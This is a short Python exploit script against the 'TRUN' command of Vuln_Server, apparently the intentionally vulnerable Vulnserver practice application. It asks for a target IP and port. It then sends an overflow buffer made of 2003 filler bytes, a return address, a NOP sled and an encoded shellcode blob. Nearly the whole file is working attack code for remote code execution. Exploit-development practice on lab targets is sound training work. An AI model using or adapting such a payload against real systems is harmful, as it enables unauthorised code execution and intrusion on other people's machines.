#!/usr/bin/python3

import sys,socket
from time import sleep


print("****************Vuln_Server Vulnerability*************")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter the port number:\n")

if(len(ip_address)<=0) or (len(port_number)<=0):
    if(len(ip_address)>0) and (len(port_number)<=0):
        print("*"*30)
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0):
        print("*"*30)
        print("IP Address field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")
elif(len(ip_address)>0) or (len(port_number)>0):
        print("*"*30)
        buf =  b""
        buf += b"\xbd\x0a\x02\xa8\x97\xd9\xca\xd9\x74\x24\xf4\x5a"
        buf += b"\x29\xc9\xb1\x52\x31\x6a\x12\x83\xc2\x04\x03\x60"
        buf += b"\x0c\x4a\x62\x88\xf8\x08\x8d\x70\xf9\x6c\x07\x95"
        buf += b"\xc8\xac\x73\xde\x7b\x1d\xf7\xb2\x77\xd6\x55\x26"
        buf += b"\x03\x9a\x71\x49\xa4\x11\xa4\x64\x35\x09\x94\xe7"
        buf += b"\xb5\x50\xc9\xc7\x84\x9a\x1c\x06\xc0\xc7\xed\x5a"
        buf += b"\x99\x8c\x40\x4a\xae\xd9\x58\xe1\xfc\xcc\xd8\x16"
        buf += b"\xb4\xef\xc9\x89\xce\xa9\xc9\x28\x02\xc2\x43\x32"
        buf += b"\x47\xef\x1a\xc9\xb3\x9b\x9c\x1b\x8a\x64\x32\x62"
        buf += b"\x22\x97\x4a\xa3\x85\x48\x39\xdd\xf5\xf5\x3a\x1a"
        buf += b"\x87\x21\xce\xb8\x2f\xa1\x68\x64\xd1\x66\xee\xef"
        buf += b"\xdd\xc3\x64\xb7\xc1\xd2\xa9\xcc\xfe\x5f\x4c\x02"
        buf += b"\x77\x1b\x6b\x86\xd3\xff\x12\x9f\xb9\xae\x2b\xff"
        buf += b"\x61\x0e\x8e\x74\x8f\x5b\xa3\xd7\xd8\xa8\x8e\xe7"
        buf += b"\x18\xa7\x99\x94\x2a\x68\x32\x32\x07\xe1\x9c\xc5"
        buf += b"\x68\xd8\x59\x59\x97\xe3\x99\x70\x5c\xb7\xc9\xea"
        buf += b"\x75\xb8\x81\xea\x7a\x6d\x05\xba\xd4\xde\xe6\x6a"
        buf += b"\x95\x8e\x8e\x60\x1a\xf0\xaf\x8b\xf0\x99\x5a\x76"
        buf += b"\x93\x65\x32\x1c\xb0\x0e\x41\xdc\x27\x93\xcc\x3a"
        buf += b"\x2d\x3b\x99\x95\xda\xa2\x80\x6d\x7a\x2a\x1f\x08"
        buf += b"\xbc\xa0\xac\xed\x73\x41\xd8\xfd\xe4\xa1\x97\x5f"
        buf += b"\xa2\xbe\x0d\xf7\x28\x2c\xca\x07\x26\x4d\x45\x50"
        buf += b"\x6f\xa3\x9c\x34\x9d\x9a\x36\x2a\x5c\x7a\x70\xee"
        buf += b"\xbb\xbf\x7f\xef\x4e\xfb\x5b\xff\x96\x04\xe0\xab"
        buf += b"\x46\x53\xbe\x05\x21\x0d\x70\xff\xfb\xe2\xda\x97"
        buf += b"\x7a\xc9\xdc\xe1\x82\x04\xab\x0d\x32\xf1\xea\x32"
        buf += b"\xfb\x95\xfa\x4b\xe1\x05\x04\x86\xa1\x26\xe7\x02"
        buf += b"\xdc\xce\xbe\xc7\x5d\x93\x40\x32\xa1\xaa\xc2\xb6"
        buf += b"\x5a\x49\xda\xb3\x5f\x15\x5c\x28\x12\x06\x09\x4e"
        buf += b"\x81\x27\x18"

        buffer=b"A" * 2003 + b"\xAF\x11\x50\x62" + b"\x90" * 16 + buf 
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        s.send((b"TRUN /.:/" + buffer + b"\r\n"))
        s.close()
